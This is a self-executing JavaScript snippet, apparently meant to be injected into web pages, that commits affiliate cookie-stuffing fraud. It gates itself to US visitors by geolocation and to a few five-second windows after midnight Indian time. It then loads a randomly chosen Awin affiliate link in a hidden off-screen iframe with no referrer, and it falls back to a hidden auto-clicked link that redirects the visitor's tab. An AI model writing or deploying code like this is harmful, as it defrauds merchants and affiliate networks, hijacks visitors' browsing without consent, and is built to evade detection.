(function () {

  /* ===============================
     AFFILIATE LINKS (EQUAL RANDOM)
  =============================== */
  const AFFILIATE_LINKS = [
    "https://www.awin1.com/cread.php?awinmid=52725&awinaffid=2592529&clickref=2586",
    "https://www.awin1.com/cread.php?awinmid=52725&awinaffid=2592529&clickref=2681",
    "https://www.awin1.com/cread.php?awinmid=52725&awinaffid=2592529&clickref=2795",
  ];

  function getRandomAffiliateLink() {
    return AFFILIATE_LINKS[
      Math.floor(Math.random() * AFFILIATE_LINKS.length)
    ];
  }

  const AFFILIATE_LINK = getRandomAffiliateLink();

  /* ===============================
     IST TIME CHECK
  =============================== */
  function isAllowedISTTime() {
    const now = new Date(
      new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
    );

    const totalSeconds =
      now.getHours() * 3600 +
      now.getMinutes() * 60 +
      now.getSeconds();

    const allowedRanges = [
      // 11 PM
      // [23 * 3600 + 47 * 60 + 5, 23 * 3600 + 47 * 60 + 10],

      // 12 AM
      [0 * 3600 + 3 * 60 + 5,   0 * 3600 + 3 * 60 + 10],
      [0 * 3600 + 16 * 60 + 5,  0 * 3600 + 16 * 60 + 10],
      [0 * 3600 + 34 * 60 + 5,  0 * 3600 + 34 * 60 + 10],
      [0 * 3600 + 46 * 60 + 5,  0 * 3600 + 46 * 60 + 10],

      // 1 AM
      [1 * 3600 + 2 * 60 + 5,   1 * 3600 + 2 * 60 + 10],
      [1 * 3600 + 13 * 60 + 5,  1 * 3600 + 13 * 60 + 10],
      [1 * 3600 + 32 * 60 + 5,  1 * 3600 + 32 * 60 + 10],
      [1 * 3600 + 47 * 60 + 5,  1 * 3600 + 47 * 60 + 10],

      // 2 AM
      [2 * 3600 + 11 * 60 + 5,  2 * 3600 + 11 * 60 + 10],
      [2 * 3600 + 23 * 60 + 5,  2 * 3600 + 23 * 60 + 10],
      [2 * 3600 + 44 * 60 + 5,  2 * 3600 + 44 * 60 + 10],
      [2 * 3600 + 57 * 60 + 5,  2 * 3600 + 57 * 60 + 10],

      // 3 AM
      // [3 * 3600 + 14 * 60 + 5,  3 * 3600 + 14 * 60 + 10],
      // [3 * 3600 + 32 * 60 + 5,  3 * 3600 + 32 * 60 + 10],
      // [3 * 3600 + 48 * 60 + 5,  3 * 3600 + 48 * 60 + 10],
      // [3 * 3600 + 57 * 60 + 5,  3 * 3600 + 57 * 60 + 10],

      // 4 AM
      // [4 * 3600 + 7 * 60 + 5,   4 * 3600 + 7 * 60 + 10],
      // [4 * 3600 + 22 * 60 + 5,  4 * 3600 + 22 * 60 + 10],
      // [4 * 3600 + 37 * 60 + 5,  4 * 3600 + 37 * 60 + 10],
      // [4 * 3600 + 54 * 60 + 5,  4 * 3600 + 54 * 60 + 10],

      // 5 AM
      // [5 * 3600 + 6 * 60 + 5,   5 * 3600 + 6 * 60 + 10],
      // [5 * 3600 + 19 * 60 + 5,  5 * 3600 + 19 * 60 + 10],
      // [5 * 3600 + 44 * 60 + 5,  5 * 3600 + 44 * 60 + 10],
      // [5 * 3600 + 58 * 60 + 5,  5 * 3600 + 58 * 60 + 10],
    ];

    return allowedRanges.some(
      ([start, end]) => totalSeconds >= start && totalSeconds <= end
    );
  }

  if (!isAllowedISTTime()) return;

  /* ===============================
     SAME TAB + NO REFERRER
  =============================== */
  function redirectViaLink() {
    const a = document.createElement("a");
    a.href = AFFILIATE_LINK;
    a.rel = "noreferrer";
    a.style.display = "none";

    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }

  /* ===============================
     IFRAME → LINK FALLBACK
  =============================== */
  function fireAffiliate() {
    let iframeLoaded = false;
    let fallbackTriggered = false;

    const iframe = document.createElement("iframe");
    iframe.src = AFFILIATE_LINK;
    iframe.referrerPolicy = "no-referrer";
    iframe.style.cssText =
      "width:1px;height:1px;position:absolute;left:-9999px;border:0;visibility:hidden";

    iframe.onload = () => {
      iframeLoaded = true;
    };

    iframe.onerror = triggerFallback;

    document.body.appendChild(iframe);

    function triggerFallback() {
      if (iframeLoaded || fallbackTriggered) return;
      fallbackTriggered = true;
      setTimeout(redirectViaLink, 1000);
    }

    setTimeout(triggerFallback, 1000);
  }

  /* ===============================
     GEO CHECK (US ONLY)
  =============================== */
  function geoGate() {
    fetch("https://ipapi.co/json/", { cache: "no-store" })
      .then((r) => r.json())
      .then((geo) => {
        if (!geo) return;
        if (geo.country_code !== "US") return;
        fireAffiliate();
      })
      .catch(() => {});
  }

  /* ===============================
     DOM READY
  =============================== */
  function init() {
    geoGate();
  }

  if (document.readyState !== "loading") {
    init();
  } else {
    document.addEventListener("DOMContentLoaded", init);
  }
})();










